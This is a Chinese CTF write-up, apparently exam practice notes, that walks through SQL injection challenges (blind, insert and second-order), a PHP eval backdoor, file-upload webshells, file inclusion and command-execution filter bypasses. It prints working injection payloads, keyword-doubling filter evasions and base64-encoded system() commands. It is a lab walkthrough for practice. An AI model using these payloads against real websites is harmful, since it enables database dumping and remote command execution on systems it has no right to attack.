[嘤嘤嘤]timesql #SQL注入漏洞 时间/盲注
题名写了timesql但是测试直接异或盲注他回显不一致，就用异或盲注，服务器太烂了，用时间盲注时间一大一小看不清结果。
全程用bp做
爆数据库名 为hazel
```
username=admin'%20anandd%20subsubstrstr(database()%2c§1§%2c1)%3d'§2§'%20%23&password=114514
```
![[Pasted image 20240327161324.png]]
爆表名长度 为5
```
username=admin'%20anandd%20length((selselectect%20table_name%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3ddatabase()))%20%3d%20§1§%20%23
```
![[Pasted image 20240328190530.png]]
爆表名 为 users
```
username=admin'%20anandd%20subsubstrstr((selselectect%20table_name%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§a§'%20%23
```
![[Pasted image 20240328191209.png]]
爆字段名 为 id,username,password
```
username=admin'%20anandd%20subsubstrstr((selselectect%20group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name%3d'users'%20anandd%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§i§'%20%23
```
![[Pasted image 20240328193336.png]]
爆字段(payload列表注意加上flag所需的字符)：
```
admin'%20anandd%20subsubstrstr((selselectect%20group_concat(id%2c%22%3a%22%2cusername%2c%22%3a%22%2cpasswoorrd%2c%22%3a%22)%20frfromom%20hazel.users)%2c§1§%2c1)%20%3d%20'§i§'%20%23
```

| id  | username | password                                    |
| --- | -------- | ------------------------------------------- |
| 0   | admin    | admin666666                                 |
| 1   | hazel    | hazel{d3f3bac6-3fe8-4e5e-8680-40a5b0003799} |

[嘤嘤嘤]insertsql #SQL注入漏洞 
insert注入，查看页面，有上传文章的功能
![[Pasted image 20240329124443.png]]
尝试在标题注入，其显示上传失败，并快速重定向至主页面，但是显示了一瞬间的sql语句，打开BP的intercept,显示出了其使用的sql语句：
```
insert into article(title,author,description,content,dateline) values('114514' and 1=2#','114514','114514','114514',1711687035)
```
可以看到除了标题还有4个字段，那就在标题构造注入：
```
114514',database(),user(),'114514',1919810)#
```
去管理文章的页面点击修改我们刚发布的文章，可以看到其回显了数据库名以及用户名：
![[Pasted image 20240329124936.png]]
爆表名 为article,hazel
```
10086',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'10086','10086','1919810')#
```
![[Pasted image 20240329125252.png]]
爆字段名 为 id,flag_is_here
```
10086',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="hazel"),'10086','10086','1919810')#
```
![[Pasted image 20240329125514.png]]
dump
```
10086',(select flag_is_here from hazel.hazel where id=2),'10086','10086','1919810')#
```

| id  | flag_is_here                                |
| --- | ------------------------------------------- |
| 1   | shuaige                                     |
| 2   | hazel{863184db-8501-49b4-a8c9-96bc10101c72} |

[嘤嘤嘤]成绩单 #SQL注入漏洞 
页面只有一个查询框，查1出成绩，查异常值不出，尝试布尔盲注猜解闭合方式为：单引号闭合
`1' and 1=2 #`
爆数据库名长度 为 5
```
id=1'+and+length(database())%3d§1§%23
```
![[Pasted image 20240329131949.png]]
爆数据库名 为 hazel
```
id=1'+and+substr(database(),§1§,1)%3d'§1§'%23
```
![[Pasted image 20240329132535.png]]
爆表名总长度 为 7
```
id=1'+and+length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()))%3d§1§%23
```
![[Pasted image 20240329132859.png]]
爆表名 为 fl4g,sc
```
id=1'+and+substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),§1§,1)%3d'§1§'%23
```
![[Pasted image 20240329133352.png]]
爆字段长度 为 10
```
id=1'+and+length((select+group_concat(column_name)+from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d'fl4g'))%3d§1§%23
```
![[Pasted image 20240329135041.png]]
dump长度 为42
```
id=1'+and+length((select+*+from+hazel.fl4g))%3d§1§%23
```
dump
```
id=1'+and+substr((select+*+from+hazel.fl4g),§1§,1)%3d'§1§'%23
```
```
hazel{8c4c152d-1aa9-4991-8aac-951ca6e3efa0}
```
[嘤嘤嘤]P1_1
base64加密注入，爆字段数找回显点（让他的不成立）不要用and，页面也不会回显错误，错误就不显示结果
[嘤嘤嘤]P1_2
[嘤嘤嘤]P1_3
```
<?php

@$a = $_POST['Hello'];

if(isset($a)){

@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10='));

}

?>

Hello

<br>

閫忚繃鐜拌薄鐪嬫湰璐紝涓栫晫寰堢畝鍗曪紒

W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=

[@eval(base64_decode($_POST[z0]));]

z0=system('ls'); --> z0=c3lzdGVtKCdscycpOw==

Hello=12312321&z0=c3lzdGVtKCdscycpOw==

Hello=12312321&z0=c3lzdGVtKCd0YWMgLi4va2V5LnBocCcpOw==
```

^bf5f69

[嘤嘤嘤]P1_4
命令执行，
过滤了cat head tail cp mv vi vim
使用grep '\*' ../flag拿flag
[嘤嘤嘤]P1_5
直接禁用JS防止其生成随机数，登录
这题key错的
[嘤嘤嘤]P2_1
sql注入
过滤：
`空格 # union`
绕过：
`/**/ %23 ununionion`
不过只是让读取文件，直接loadfile
[嘤嘤嘤]P2_2
文件上传
直接传带图片头的图片拦截加马改phtml
[嘤嘤嘤]P2_3
文件包含
使用php://filter/read=convert.base64-encode/resource=..key.php
拿到flag
[嘤嘤嘤]P2_4
命令执行
过滤了ls cat，直接定义变量绕过
[嘤嘤嘤]P2_5
日志跳
[嘤嘤嘤]P3_1
二次注入
注册admin'#123，重置密码，改的是admin密码。
[嘤嘤嘤]P3_2
文件上传
很简单只做了文件头过滤，没过滤php，所以不要一上来试phtml，万一php就行呢
[嘤嘤嘤]P3_3
和[[EXAM特供WP#^bf5f69]]P1_3一样的
[嘤嘤嘤]P3_4
代审&命令执行
cmd参数长度小于30执行cmd但不回显。
使用反引号执行命令将其重定向至文件
有admin文件夹及其下的backdoor.php
构造命令超30，使用通配符减小长度。
```
GET /start/vul.php?cmd=echo+"`cat+../a*/*.php`">1.txt
```
[嘤嘤嘤]P3_5
